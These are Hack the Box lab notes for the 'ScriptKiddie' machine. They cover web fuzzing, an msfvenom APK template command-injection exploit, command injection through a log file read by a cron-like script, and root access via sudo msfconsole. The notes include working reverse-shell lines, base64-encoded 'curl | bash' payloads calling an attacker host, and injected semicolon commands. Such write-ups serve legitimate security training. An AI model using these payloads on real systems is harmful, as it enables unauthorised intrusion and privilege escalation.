ScriptKiddie - Hack the Box Notes - Linux Easy

Running a gobuster
Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $gobuster dir -u http://10.10.10.226:5000/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster-root.log 
====================================================================================================================================

From looking at the website we can infer that we can run nmap scans from the web page we can even though a command line post request
to the server to execute scans based on analyzing the web request from firefox web developer network tools
Commands and Output:
====================================================================================================================================
curl -X POST -d 'ip=127.0.0.1&action=scan' 10.10.10.226:5000
====================================================================================================================================

Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $curl -X POST -d 'ip=127.0.0.1&action=scan' 10.10.10.226:5000
<html>
	<head>
		<title>k1d'5 h4ck3r t00l5</title>
		<link href="static/hacker.css" rel="stylesheet">
	</head>
	<body>
		<h1>k1d'5 h4ck3r t00l5</h1>
		<hr/>
		<div style="width: 100%; display: table;">
			<div style="display: table-cell; width: 50%">
				<h2>nmap</h2>
				<h4>scan top 100 ports on an ip</h4>
				<form action="/" method="post">
					<label for="ip">ip: </label>
					<input type="text" id="ip" name="ip"><br/><br/>
					<input type="submit" value="scan" name="action">
				</form>
			</div>
			<div style="display: table-cell; width: 50%;">
				<p style="white-space: pre-wrap;">Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-08 02:35 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000067s latency).
Not shown: 98 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
</p>
				<p class="text-danger" style="white-space: pre-wrap;"></p>
			</div>
		</div>
		<hr/>
		<div style="width: 100%; display: table;">
			<div style="display: table-cell; width: 50%">
				<h2>payloads</h2>
				<h4>venom it up - gen rev tcp meterpreter bins</h4>
				<form action="/" method="post" enctype="multipart/form-data">
					<label for="os">os: </label>
					<select name="os" id="os">
						<option value="windows">windows</option>
						<option value="linux">linux</option>
						<option valud="android">android</option>
					</select><br/></br/>
					<label for="lhost">lhost: </label>
					<input type="text" id="lhost" name="lhost"><br/><br/>
					<label for="template">template file (optional): </label>
					<input type="file" id="template" name="template"><br/><br/>
					<input type="submit" value="generate" name="action">
				</form>
			</div>
			<div style="display: table-cell; width: 50%;">
				
				<p class="text-danger" style="white-space: pre-wrap;"></p>
			</div>
		</div>
		<hr/>
		<div style="width: 100%; display: table;">
			<div style="display: table-cell; width: 50%">
				<h2>sploits</h2>
				<h4>searchsploit FTW</h4>
				<form action="/" method="post">
					<label for="search">search: </label>
					<input type="text" id="search" name="search"><br/><br/>
					<input type="submit" value="searchsploit" name="action">

				</form>
			</div>
			<div style="display: table-cell; width: 50%;">
				<p style="white-space: pre;"></p>
				<p class="text-danger"></p>
			</div>
		</div>
	</body>
</html>
====================================================================================================================================

We can even use ffuf to fuzz some of the fields.
Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $ffuf -u http://10.10.10.226:5000 -d 'ip=127.0.0.1FUZZ&action=scan' -w /opt/SecLists/Fuzzing/special-chars.txt -x http://127.0.0.1:8080 
====================================================================================================================================

We try to run ffuf however the results of sending the request are blocked because the content-type is not generated by the ffuf 
payload thus negating any results.
Commands and Output:
====================================================================================================================================
POST / HTTP/1.1
Host: 10.10.10.226:5000
User-Agent: Fuzz Faster U Fool v1.3.1 Kali Exclusive <3
Content-Length: 24
Accept-Encoding: gzip, deflate
Connection: close

ip=127.0.0.1&action=scan
====================================================================================================================================

New payload with content-type.
Commands and Output:
====================================================================================================================================
POST / HTTP/1.1
Host: 10.10.10.226:5000
User-Agent: Fuzz Faster U Fool v1.3.1 Kali Exclusive <3
Content-Length: 24
Accept-Encoding: gzip, deflate
Connection: close
Content-Type:	application/x-www-form-urlencoded

ip=127.0.0.1&action=scan
====================================================================================================================================

NOTE: Some of the payloads for fuzzing may crash the webserver.
Commands and Output:
====================================================================================================================================
└──╼ $ffuf -u http://10.10.10.226:5000 -d 'ip=127.0.0.1FUZZ&action=scan' -w /opt/SecLists/Fuzzing/special-chars.txt -x http://127.0.0.1:8080 -H 'Content-Type:    application/x-www-form-urlencoded'
====================================================================================================================================

If the payload is '!' we get an 'invalid ip' response
Commands and Output:
====================================================================================================================================
		<div style="display: table-cell; width: 50%;">
				<p style="white-space: pre-wrap;"></p>
				<p class="text-danger" style="white-space: pre-wrap;">invalid ip</p>
			</div>
		</div>
====================================================================================================================================

We can now send the request without sending it to the burp proxy and we get the following results.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $ffuf -u http://10.10.10.226:5000 -d 'ip=127.0.0.1FUZZ&action=scan' -w /opt/SecLists/Fuzzing/special-chars.txt  -H 'Content-Type:  application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.10.226:5000
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : ip=127.0.0.1FUZZ&action=scan
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

#                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
`                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
=                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
{                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
+                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
!                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
~                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
@                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
_                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
$                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
*                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
^                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
}                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
%                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
(                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
)                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
]                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
,                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
;                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
.                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
\                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
_                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
/                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
[                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
|                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
?                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
'                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
:                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
"                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
<                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
>                       [Status: 200, Size: 2145, Words: 115, Lines: 67]
&                       [Status: 200, Size: 2424, Words: 161, Lines: 76]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
====================================================================================================================================

We filter out some of the results by adding the '-fw' options to filter out the number of word responses and see what is unique.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $ffuf -u http://10.10.10.226:5000 -d 'ip=127.0.0.1FUZZ&action=scan' -w /opt/SecLists/Fuzzing/special-chars.txt  -H 'Content-Type:  application/x-www-form-urlencoded' -fw 115

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.10.226:5000
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : ip=127.0.0.1FUZZ&action=scan
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 115
________________________________________________

&                       [Status: 200, Size: 2424, Words: 161, Lines: 76]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
====================================================================================================================================

It appears that '&' outputs a different response. It is a valid post request so it just does a normal scan we can do a url encode so 
that is doesn't go without the separating parameters and we just get an invalid ip so we will fuzz the next parameter and see what we
get.

First we create a request using the web broswer tool in the 'Searchsploit FTW' search box and send the request via burp suite to see
what is exactly sent so that we can replicate the same behavior in ffuf.
Commands and Output:
====================================================================================================================================
POST / HTTP/1.1
Host: 10.10.10.226:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://10.10.10.226:5000
DNT: 1
Connection: close
Referer: http://10.10.10.226:5000/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

search=test&action=searchsploit
====================================================================================================================================

We now have the search parameter and the action paramter that we can use to fuzz thos fields
Commands and Output:
====================================================================================================================================
└──╼ $ffuf -u http://10.10.10.226:5000 -d 'search=testFUZZ&action=searchsploit' -w /opt/SecLists/Fuzzing/special-chars.txt  -H 'Content-Type:     application/x-www-form-urlencoded'
====================================================================================================================================

We don't really find anything by using ffuf so we now look at the payloads seach option, we now look at msvenom and see if the is any
exploits using searchsploit 
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $searchsploit msfvenom
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                   | multiple/local/49491.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
====================================================================================================================================

We can now examine the cve and sse what we can find even though we have no idea what version of msfvenom the victim is running.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $searchsploit -x multiple/local/49491.py
====================================================================================================================================

We can now copy the payload for the exploit locally and modify it to return a bash shell if possible. We try to curl first to see
if uploading a malicous apk triggers a response and indeed it does.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $python3 49491.py 
[+] Manufacturing evil apkfile
Payload: curl 10.10.14.28
-dname: CN='|echo Y3VybCAxMC4xMC4xNC4yOA== | base64 -d | bash #

  adding: empty (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmph6beiwkv/evil.apk
Do: msfvenom -x /tmp/tmph6beiwkv/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $cp /tmp/tmph6beiwkv/evil.apk .
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $ls
49491.py  evil.apk  gobuster-root.log  nmap  notes.txt
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $sudo nc -lnvp 80
[sudo] password for user: 
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.226.
Ncat: Connection from 10.10.10.226:40738.
GET / HTTP/1.1
Host: 10.10.14.28
User-Agent: curl/7.68.0
Accept: */*

====================================================================================================================================

We can now create a script that be downloaded via url and executed remotely through bash
The payload change is shown
Commands and Output:
====================================================================================================================================
# Change me
payload = 'curl 10.10.14.28/shell.sh | bash'
..
..
..
shell.sh
bash -i >& /dev/tcp/10.10.14.28/9001 0>&1
====================================================================================================================================


Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/scriptkiddie/www]
└──╼ $sudo python3 -m http.server 80
[sudo] password for user: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.226 - - [07/Jun/2021 20:25:18] "GET /shell.sh HTTP/1.1" 200 -

..
..
..

┌─[✗]─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $nc -lnvp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.226.
Ncat: Connection from 10.10.10.226:33144.
bash: cannot set terminal process group (894): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ whoami
whoami
kid
====================================================================================================================================

The reverse shell is acquired. Once in we start checing for multiple things such as sudo privileges. We go to the mainusers directory
and find a logs folder which apprarntly the webserver is using
Commands and Output:
====================================================================================================================================
kid@scriptkiddie:~/html$ grep -Ri logs
app.py:        with open('/home/kid/logs/hackers', 'a') as f:
====================================================================================================================================

We find the hacker file but don't really see anything being written so we download pspy64s to sse what processes are being used to se
if we can elevate or pivot to new privs.

After downloading and executing the the "payloads" options on the web page we acutally happens when we trigger the msfvenom exploit
Commands and Output:
====================================================================================================================================
2021/06/08 04:51:48 CMD: UID=1000 PID=46452  | sh -c git --version > /dev/null 2>&1 
2021/06/08 04:51:48 CMD: UID=1000 PID=46453  | 
2021/06/08 04:51:55 CMD: UID=1000 PID=46456  | /bin/bash /usr/bin/apktool -version 
2021/06/08 04:51:55 CMD: UID=???  PID=46459  | ???
2021/06/08 04:51:55 CMD: UID=1000 PID=46479  | keytool 
2021/06/08 04:51:56 CMD: UID=1000 PID=46496  | jarsigner 
2021/06/08 04:51:56 CMD: UID=1000 PID=46514  | zipalign 
2021/06/08 04:51:56 CMD: UID=1000 PID=46515  | sh -c keytool -J-Duser.language=en -printcert -jarfile "/tmp/tmpzvjpnjvx.apk" 
2021/06/08 04:51:56 CMD: UID=1000 PID=46517  | keytool -J-Duser.language=en -printcert -jarfile /tmp/tmpzvjpnjvx.apk 
2021/06/08 04:51:58 CMD: UID=1000 PID=46535  | sh -c keytool -genkey -v -keystore /tmp/d20210608-46451-uqplrc/signing.keystore       -alias signing.key -storepass android -keypass android -keyalg RSA       -keysize 2048 -startdate '2021/06/08 03:24:07'       -validity 90 -dname 'CN="'|echo Y3VybCAxMC4xMC4xNC4yOC9zaGVsbC5zaCB8IGJhc2g= | base64 -d | bash #"' 
2021/06/08 04:51:58 CMD: UID=1000 PID=46536  | sh -c keytool -genkey -v -keystore /tmp/d20210608-46451-uqplrc/signing.keystore       -alias signing.key -storepass android -keypass android -keyalg RSA       -keysize 2048 -startdate '2021/06/08 03:24:07'       -validity 90 -dname 'CN="'|echo Y3VybCAxMC4xMC4xNC4yOC9zaGVsbC5zaCB8IGJhc2g= | base64 -d | bash #"' 
2021/06/08 04:51:58 CMD: UID=1000 PID=46539  | bash 
2021/06/08 04:51:58 CMD: UID=1000 PID=46538  | sh -c keytool -genkey -v -keystore /tmp/d20210608-46451-uqplrc/signing.keystore       -alias signing.key -storepass android -keypass android -keyalg RSA       -keysize 2048 -startdate '2021/06/08 03:24:07'       -validity 90 -dname 'CN="'|echo Y3VybCAxMC4xMC4xNC4yOC9zaGVsbC5zaCB8IGJhc2g= | base64 -d | bash #"' 
2021/06/08 04:51:58 CMD: UID=1000 PID=46537  | sh -c keytool -genkey -v -keystore /tmp/d20210608-46451-uqplrc/signing.keystore       -alias signing.key -storepass android -keypass android -keyalg RSA       -keysize 2048 -startdate '2021/06/08 03:24:07'       -validity 90 -dname 'CN="'|echo Y3VybCAxMC4xMC4xNC4yOC9zaGVsbC5zaCB8IGJhc2g= | base64 -d | bash #"' 
2021/06/08 04:51:58 CMD: UID=1000 PID=46542  | bash 
2021/06/08 04:51:58 CMD: UID=1000 PID=46541  | curl 10.10.14.28/shell.sh 
2021/06/08 04:51:58 CMD: UID=1000 PID=46555  | bash 
2021/06/08 04:51:58 CMD: UID=1000 PID=46559  | /bin/sh /usr/bin/lesspipe 
2021/06/08 04:51:58 CMD: UID=1000 PID=46563  | 
2021/06/08 04:52:01 CMD: UID=0    PID=46565  | /usr/sbin/CRON -f 
2021/06/08 04:52:01 CMD: UID=???  PID=46567  | ???
====================================================================================================================================


As you can see the payload is executed, and witin msfvenom it does a ruby equivalent of psopen of python to execute a command, the 
exploit leverages this kind of functionality to create a payload to echo to bash and execute. 

Now that we have pspy installed and working we can test other parts of the web page and see if any processes are triggered.
In the 'searchsploit' search option if we enter special characters we get the following output from pspy after the request is 
completed.
Commands and Output:
====================================================================================================================================
2021/06/08 04:54:01 CMD: UID=0    PID=46569  | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 
2021/06/08 04:54:01 CMD: UID=???  PID=46570  | ???
2021/06/08 04:55:01 CMD: UID=0    PID=46577  | pkill -f keytool 
2021/06/08 04:55:01 CMD: UID=0    PID=46575  | /bin/sh -c pkill -f keytool && pkill -f nmap & rm -rf /tmp/d2* 
2021/06/08 04:55:01 CMD: UID=0    PID=46574  | 
2021/06/08 04:55:01 CMD: UID=0    PID=46571  | /usr/sbin/CRON -f 
2021/06/08 04:56:01 CMD: UID=0    PID=46579  | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 
2021/06/08 04:56:01 CMD: UID=0    PID=46578  | /usr/sbin/CRON -f 
2021/06/08 04:58:01 CMD: UID=???  PID=46582  | ???
2021/06/08 04:58:01 CMD: UID=???  PID=46581  | ???
2021/06/08 04:59:10 CMD: UID=1001 PID=46585  | /bin/bash /home/pwn/scanlosers.sh 
2021/06/08 04:59:10 CMD: UID=1001 PID=46593  | 
2021/06/08 04:59:10 CMD: UID=1001 PID=46592  | nmap --top-ports 10 -oN recon/10.10.14.28.nmap 10.10.14.28 
2021/06/08 04:59:10 CMD: UID=1001 PID=46591  | /bin/bash /home/pwn/scanlosers.sh 
2021/06/08 04:59:10 CMD: UID=1001 PID=46590  | sh -c nmap --top-ports 10 -oN recon/10.10.14.28.nmap 10.10.14.28 2>&1 >/dev/null 
2021/06/08 04:59:10 CMD: UID=0    PID=46594  | /usr/sbin/incrond 
2021/06/08 04:59:10 CMD: UID=1001 PID=46598  | /bin/bash /home/pwn/scanlosers.sh 
2021/06/08 04:59:10 CMD: UID=1001 PID=46597  | sort -u 
2021/06/08 04:59:10 CMD: UID=1001 PID=46596  | cut -d  -f3- 
2021/06/08 04:59:10 CMD: UID=1001 PID=46595  | /bin/bash /home/pwn/scanlosers.sh 
2021/06/08 04:59:12 CMD: UID=0    PID=46601  | /usr/sbin/incrond 
2021/06/08 04:59:12 CMD: UID=1001 PID=46602  | sed -i s/open  /closed/g /home/pwn/recon/sedrRNB8Y 
====================================================================================================================================

It appears that the user is running the scanlosers.sh script with the pwn user
Commands and Output:
====================================================================================================================================
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$ 
====================================================================================================================================

From the looks of it, it appears that when a user attempts any kind of fuzzing on the search functionality such as adding special 
characters, the offending ip is logged and the results are outputed into hackers log file. 

This can be exploited by simply creating 3 parameters and adding a semicolon to execute an extra command such as a reverse shell.
In our case we will leverage our exisiting shell.sh to get a reverse shell as the pwn user.

We will write to the hackers log file and have a listening web server and netcat session to get it to work,
Commands and Output:
====================================================================================================================================
kid@scriptkiddie:~/logs$ echo "123 123 ;curl 10.10.14.28/shell.sh | bash" >> hackers

..
..
..
kid@scriptkiddie:~/logs$ tail -f hackers 
123 123 ;curl 10.10.14.28/shell.sh
tail: hackers: file truncated
123 123 ;curl 10.10.14.28/shell.sh | ab
tail: hackers: file truncated
123 123 ;curl 10.10.14.28/shell.sh | bash
tail: hackers: file truncated

..
...
..
┌─[user@parrot-virtual]─[~/htb/scriptkiddie]
└──╼ $nc -lnvp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.226.
Ncat: Connection from 10.10.10.226:33196.
bash: cannot set terminal process group (869): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
====================================================================================================================================

We now get a working pwn shell back. Running sudo we find an easy way to get root.
Commands and Output:
====================================================================================================================================
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
====================================================================================================================================

We get root by simply executing the msfconsole with sudo and typing bash within msfconsole.
Commands and Output:
====================================================================================================================================
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using info, or the enhanced version in your browser with info -d

msf6 > bash
[*] exec: bash

root@scriptkiddie:/home/pwn# whoami
root
root@scriptkiddie:/home/pwn# 
====================================================================================================================================

We can also get the root shell with irb, which is used for ruby debugging
Commands and Output:
====================================================================================================================================
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
root@scriptkiddie:/home/pwn#
====================================================================================================================================
